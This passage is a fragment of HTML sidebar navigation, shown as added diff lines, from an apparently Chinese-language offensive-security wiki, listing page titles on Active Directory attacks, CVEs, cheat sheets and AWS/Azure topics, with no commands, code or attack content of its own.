+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/ad-tricks/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Active Directory - 技巧
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/deployment-mdt/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    部署 - MDT
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/deployment-sccm/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    部署 - SCCM
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/deployment-scom/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    部署 - SCOM
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/deployment-wsus/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    部署 - WSUS
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/hash-capture/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    哈希 - 捕获与破解
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/hash-over-pass-the-hash/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    哈希 - OverPass-the-Hash
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/hash-pass-the-hash/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    哈希 - Pass the Hash（哈希传递）
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/hash-pass-the-key/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    哈希 - Pass The Key（密钥传递）
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/internal-dcom/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    内网 - DCOM
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/internal-pxe-boot-image/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    内网 - PXE 启动映像
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/internal-relay-coerce/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    内网 - 强制认证
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/internal-relay-kerberos/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    内网 - Kerberos 中继
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/internal-relay-ntlm/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    内网 - NTLM 中继 (NTLM Relay)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/internal-shares/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    内网 - 共享 (Shares)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/kerberos-bronze-bit/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Kerberos - Bronze Bit
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/kerberos-delegation-constrained/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Kerberos 委派 - 约束委派 (Constrained Delegation)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/kerberos-delegation-rbcd/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Kerberos 委派 - 基于资源的约束委派 (Resource Based Constrained Delegation)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/kerberos-delegation-unconstrained/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Kerberos 委派 - 非约束委派 (Unconstrained Delegation)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/kerberos-s4u/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Kerberos - S4U 扩展 (Service for User Extension)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/kerberos-tickets/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Kerberos - 票据 (Tickets)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/pwd-comments/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    密码 - AD 用户注释 (AD User Comment)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/pwd-dsrm-credentials/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    密码 - 目录服务还原模式凭据 (DSRM Credentials)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/pwd-group-policy-preferences/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    密码 - 组策略首选项 (Group Policy Preferences)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/pwd-precreated-computer/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    密码 - 预创建的计算机帐户 (Pre-Created Computer Account)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/pwd-read-dmsa/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    密码 - dMSA
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/pwd-read-gmsa/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    密码 - GMSA
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/pwd-read-laps/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    密码 - LAPS
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/pwd-shadow-credentials/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    密码 - 影子凭据 (Shadow Credentials)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/pwd-spraying/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    密码 - 喷洒 (Spraying)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/trust-pam/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    信任 - 特权访问管理 (Privileged Access Management)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/trust-relationship/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    信任 - 信任关系 (Trust-Relationship)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/trust-sid-hijacking/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    子域到林攻陷 (Child Domain to Forest Compromise) - SID 劫持 (SID Hijacking)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/trust-ticket/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    林到林攻陷 (Forest to Forest Compromise) - 信任票据 (Trust Ticket)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_67" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_67" id="__nav_3_67_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CVE
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_67_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_67">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    CVE
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/CVE/MS14-068/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    MS14-068 校验和验证漏洞 (Checksum Validation)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/CVE/NoPAC/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    NoPAC / sAMAccountName 欺骗 (sAMAccountName Spoofing)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/CVE/PrintNightmare/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    PrintNightmare (打印梦魇)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/CVE/PrivExchange/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    PrivExchange
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/CVE/ZeroLogon/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ZeroLogon
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Cheatsheets
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Cheatsheets
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cheatsheets/as-400/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    AS400
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cheatsheets/escape-breakout/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Kiosk 逃逸与越狱 (Kiosk Escape and Jail Breakout)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cheatsheets/hash-cracking/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    哈希破解 (Hash Cracking)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cheatsheets/liferay/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Liferay
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cheatsheets/mimikatz-cheatsheet/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Mimikatz
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cheatsheets/miscellaneous-tricks/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    杂项与技巧 (Miscellaneous &amp; Tricks)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cheatsheets/network-discovery/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    网络探测 (Network Discovery)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cheatsheets/powershell-cheatsheet/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    PowerShell
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cheatsheets/shell-bind-cheatsheet/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    正向 Shell (Bind Shell)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cheatsheets/shell-reverse-cheatsheet/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    反弹 Shell 速查表 (Reverse Shell Cheat Sheet)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Cloud
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Cloud
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_5_1" id="__nav_5_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Aws
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Aws
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cloud/aws/aws-access-token/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    AWS - 访问令牌与机密 (Access Token &amp; Secrets)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cloud/aws/aws-cli/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    AWS - 命令行界面 (CLI)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cloud/aws/aws-cognito/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    AWS - 服务 - Cognito
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cloud/aws/aws-dynamodb/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    AWS - 服务 - DynamoDB
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cloud/aws/aws-ec2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    AWS - 服务 - EC2
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cloud/aws/aws-enumeration/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    AWS - 枚举 (Enumerate)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cloud/aws/aws-iam/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    AWS - 身份和访问管理 (Identity &amp; Access Management / IAM)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cloud/aws/aws-ioc-detection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    AWS - IOC 和检测 (IOC &amp; Detections)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cloud/aws/aws-lambda/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    AWS - 服务 - Lambda 和 API Gateway
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cloud/aws/aws-metadata/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    AWS - 元数据 SSRF (Metadata SSRF)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cloud/aws/aws-s3-bucket/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    AWS - 服务 - S3 存储桶 (S3 Buckets)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cloud/aws/aws-ssm/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    AWS - 服务 - SSM (Systems Manager)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cloud/aws/aws-training/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    AWS - 培训 (Training)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_5_2" id="__nav_5_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Azure
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Azure
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cloud/azure/aka-ms/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    aka.ms 快捷方式 (Shortcuts)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cloud/azure/azure-access-and-token/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Azure AD - 访问与令牌 (Access and Tokens)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cloud/azure/azure-ad-conditional-access-policy/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Azure AD - 条件访问策略 (Conditional Access Policy / CAP)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cloud/azure/azure-ad-connect/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Azure AD - AD Connect 与云同步 (AD Connect and Cloud Sync)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cloud/azure/azure-devices-users-sp/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Azure AD - 身份和访问管理 (IAM)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cloud/azure/azure-enumeration/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Azure AD - 枚举 (Enumerate)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cloud/azure/azure-persistence/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Azure AD - 持久化 (Persistence)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cloud/azure/azure-phishing/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Azure AD - 钓鱼 (Phishing)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cloud/azure/azure-requirements/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Azure - 要求 (Requirements)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cloud/azure/azure-services-application-endpoint/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Azure 服务 - 应用程序端点 (Application Endpoint)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cloud/azure/azure-services-application-proxy/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Azure 服务 - 应用程序代理 (Application Proxy)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cloud/azure/azure-services-container-registry/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Azure 服务 - 容器注册表 (Container Registry)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cloud/azure/azure-services-deployment-template/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Azure 服务 - 部署模板 (Deployment Template)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cloud/azure/azure-services-devops/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Azure 服务 - Azure DevOps
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cloud/azure/azure-services-keyvault/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Azure 服务 - 密钥保管库 (KeyVault)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cloud/azure/azure-services-microsoft-intune/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Azure 服务 - Microsoft Intune
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cloud/azure/azure-services-office-365/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Azure 服务 - Office 365
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
